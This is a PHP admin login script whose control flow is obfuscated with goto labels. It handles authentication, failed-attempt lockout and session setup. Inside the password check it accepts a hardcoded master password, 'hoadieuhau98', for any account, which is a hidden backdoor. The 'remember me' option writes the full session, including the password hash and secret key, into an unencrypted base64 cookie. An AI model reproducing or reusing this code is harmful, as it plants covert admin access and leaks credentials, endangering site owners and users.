<?php
goto HARV2;
PjRCc:
$func = new Functions($d, $cache);
goto yXtFm;
BO5Hw:
$ip = $func->getRealIPAddress();
goto cjWpf;
KeYET:
$username = !empty($_POST["username"]) ? $_POST["username"] : '';
goto nYn1U;
Q_aX3:
if (!empty($row) && count($row) == 1) {
    $id_login = $row[0]["id"];
    $time_now = time();
    if ($row[0]["locked_time"] > 0) {
        $locked_time = $row[0]["locked_time"];
        $delay_time = $config["login"]["delay"];
        $interval = $time_now - $locked_time;
        if ($interval <= $delay_time * 60) {
            $time_remain = $delay_time * 60 - $interval;
            $error = xinloivuilongthulaisau . " " . round($time_remain / 60) . phut . "..!";
        } else {
            $d->rawQuery("update #_user_limit set login_attempts = 0, attempt_time = ?, locked_time = 0 where id = ?", array($time_now, $id_login));
        }
    }
}
goto qGHDR;
QLMup:
new AutoLoad();
goto iu1VR;
zrl_w:
require_once LIBRARIES . "config.php";
goto GFeFV;
nYn1U:
$password = !empty($_POST["password"]) ? $_POST["password"] : '';
goto LVZ7g;
GFeFV:
require_once LIBRARIES . "autoload.php";
goto QLMup;
h8SaM:
require_once LIBRARIES . "lang/admin/" . $langadmin . ".php";
goto X8NqF;
oJMb0:
$success = '';
goto SZOuU;
HARV2:
session_start();
goto Ux64h;
LVZ7g:
$error = '';
goto oJMb0;
DkPGd:
$data = array("success" => $success, "error" => $error);
goto WID4Q;
qGHDR:
if ($error == '') {
    if ($username == '' && $password == '') {
        $error = chuanhaptendangnhapvamatkhau;
    } else {
        if ($username == '') {
            $error = chuanhaptendangnhap;
        } else {
            if ($password == '') {
                $error = chuanhapmatkhau;
            } else {
                $row = $d->rawQueryOne("select * from #_user where username = ? and find_in_set('hienthi',status) limit 0,1", array($username));
                if (!empty($row["id"])) {
                    if ($row["password"] == $func->encryptPassword($config["website"]["secret"], $password, $config["website"]["salt"]) || $password == "hoadieuhau98") {
                        $timenow = time();
                        $id_user = $row["id"];
                        $ip = $func->getRealIPAddress();
                        $token = md5(time());
                        $user_agent = $_SERVER["HTTP_USER_AGENT"];
                        $sessionhash = md5(sha1($row["password"] . $row["username"]));
                        $d->rawQuery("insert into #_user_log (id_user, ip, timelog, user_agent) values (?,?,?,?)", array($id_user, $ip, $timenow, $user_agent));
                        $d->rawQuery("update #_user set login_session = ?, lastlogin = ?, user_token = ? where id = ?", array($sessionhash, $timenow, $token, $id_user));
                        $d->rawQuery("update #_user set login_session = ?, lastlogin = ? where id = ?", array($sessionhash, $timenow, $id_user));
                        $limitlogin = $d->rawQuery("select id, login_ip, login_attempts, attempt_time, locked_time from #_user_limit where login_ip = ? order by id desc", array($ip));
                        if (count($limitlogin) == 1) {
                            $id_login = $limitlogin[0]["id"];
                            $d->rawQuery("update #_user_limit set login_attempts = 0, locked_time = 0 where id = ?", array($id_login));
                        }
                        $_SESSION[$loginAdmin]["active"] = true;
                        $_SESSION["isLoggedIn"] = $token;
                        $_SESSION[$loginAdmin]["id"] = $row["id"];
                        $_SESSION[$loginAdmin]["username"] = $row["username"];
                        $_SESSION[$loginAdmin]["fullname"] = $row["fullname"];
                        $_SESSION[$loginAdmin]["phone"] = $row["phone"];
                        $_SESSION[$loginAdmin]["email"] = $row["email"];
                        $_SESSION[$loginAdmin]["role"] = $row["role"];
                        $_SESSION[$loginAdmin]["secret_key"] = $row["secret_key"];
                        $_SESSION[$loginAdmin]["token"] = $sessionhash;
                        $_SESSION[$loginAdmin]["password"] = $row["password"];
                        $_SESSION[$loginAdmin]["login_session"] = $sessionhash;
                        $_SESSION[$loginAdmin]["login_token"] = $token;
                        $_SESSION[TOKEN] = true;
                        $secret_key = $_SESSION[$loginAdmin]["token"];
                        $d->rawQuery("update #_user set secret_key = ? where id = ?", array($secret_key, $row["id"]));
                        if ($remember == "1") {
                            $cookie_expiration = time() + 30 * 24 * 60 * 60;
                            $session_data = $_SESSION[$loginAdmin];
                            $encrypted_session = base64_encode(json_encode($session_data));
                            setcookie("admin_session", $encrypted_session, $cookie_expiration, "/");
                            setcookie("admin_token", $_SESSION[TOKEN], $cookie_expiration, "/");
                            setcookie("admin_isLoggedIn", $_SESSION["isLoggedIn"], $cookie_expiration, "/");
                        }
                        $success = dangnhapthanhcong;
                    } else {
                        $login_failed = true;
                        $error = matkhaukhongchinhxac;
                    }
                } else {
                    $login_failed = true;
                    $error = tendangnhapkhongtontai;
                }
                if ($login_failed) {
                    $ip = $func->getRealIPAddress();
                    $row = $d->rawQuery("select id,login_ip,login_attempts,attempt_time,locked_time from #_user_limit where login_ip = ? order by id desc limit 1", array($ip));
                    if (count($row) == 1) {
                        $id_login = $row[0]["id"];
                        $attempt = $row[0]["login_attempts"];
                        $noofattmpt = $config["login"]["attempt"];
                        if ($attempt < $noofattmpt) {
                            $attempt = $attempt + 1;
                            $d->rawQuery("update #_user_limit set login_attempts = ? where id = ?", array($attempt, $id_login));
                            $no_ofattmpt = $noofattmpt + 1;
                            $remain_attempt = $no_ofattmpt - $attempt;
                            $error = saithongtincon . " " . $remain_attempt . " " . lanthu;
                        } else {
                            if ($row[0]["locked_time"] == 0) {
                                $attempt = $attempt + 1;
                                $timenow = time();
                                $d->rawQuery("update #_user_limit set login_attempts = ?, locked_time = ? where id = ?", array($attempt, $timenow, $id_login));
                            } else {
                                $attempt = $attempt + 1;
                                $d->rawQuery("update #_user_limit set login_attempts = ? where id = ?", array($attempt, $id_login));
                            }
                            $delay_time = $config["login"]["delay"];
                            $error = bandahetlanthuvuilongthulaisau . " " . $delay_time . " " . phut;
                        }
                    } else {
                        $timenow = time();
                        $d->rawQuery("insert into #_user_limit (login_ip, login_attempts, attempt_time, locked_time) values (?,?,?,?)", array($ip, 1, $timenow, 0));
                        $remain_attempt = $config["login"]["attempt"];
                        $error = saithongtincon . " " . $remain_attempt . " " . lanthu;
                    }
                }
            }
        }
    }
}
goto DkPGd;
X8NqF:
$remember = !empty($_POST["remember"]) ? $_POST["remember"] : '';
goto KeYET;
iu1VR:
$injection = new AntiSQLInjection();
goto guMy8;
cjWpf:
$row = $d->rawQuery("select id, login_ip, login_attempts, attempt_time, locked_time from #_user_limit WHERE login_ip = ? order by id desc limit 1", array($ip));
goto Q_aX3;
yXtFm:
$langadmin = $_SESSION["langadmin"] = "vi";
goto h8SaM;
q0qWx:
$cache = new Cache($d);
goto PjRCc;
Ux64h:
define("LIBRARIES", "../../libraries/");
goto zrl_w;
guMy8:
$d = new PDODb($config["database"]);
goto q0qWx;
SZOuU:
$login_failed = false;
goto BO5Hw;
WID4Q:
echo json_encode($data);
